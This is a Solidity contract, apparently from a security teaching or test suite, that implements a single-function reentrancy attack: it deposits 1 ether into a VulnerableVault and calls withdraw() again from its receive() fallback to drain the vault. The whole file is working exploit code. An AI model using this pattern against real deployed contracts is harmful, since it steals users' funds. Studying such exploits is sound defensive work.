// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import { VulnerableVault } from "src/security/reentrancy/single-function/VulnerableVault.sol";

contract ReentrantAttacker {
    VulnerableVault public vault;
    address public attacker;

    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(VulnerableVault vault_, address attacker_) {
        vault = vault_;
        attacker = attacker_;
    }

    function attack() external payable {
        require(msg.value == ATTACK_AMOUNT);

        vault.deposit{ value: msg.value }();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= ATTACK_AMOUNT) {
            vault.withdraw();
        }
    }

    function updateVault(address vault_) external {
        require(msg.sender == attacker);
        vault = VulnerableVault(vault_);
    }
}
